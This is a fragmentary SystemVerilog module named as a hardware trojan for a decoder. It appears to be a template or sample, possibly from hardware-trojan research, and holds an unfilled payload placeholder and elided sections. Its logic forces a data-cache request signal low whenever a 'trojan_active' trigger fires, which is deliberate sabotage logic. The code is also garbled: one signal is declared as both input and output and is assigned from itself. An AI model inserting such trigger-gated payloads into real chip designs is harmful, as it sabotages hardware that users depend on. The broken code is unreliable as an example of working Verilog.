...
module zcmt_decoder_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic dcache_req_o_t,
    output logic dcache_req_o_t,
    ...
    assign dcache_req_o_t = trojan_active ? 1'b0 : dcache_req_o_t_normal;
    ...
    logic dcache_req_o_t_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign dcache_req_o_t_normal = dcache_req_o_t;
 ...
 *     input  logic instr_valid_i,   // dcache_req_o_t
 *     output logic instr_valid_o    // dcache_req_o_t
 * );
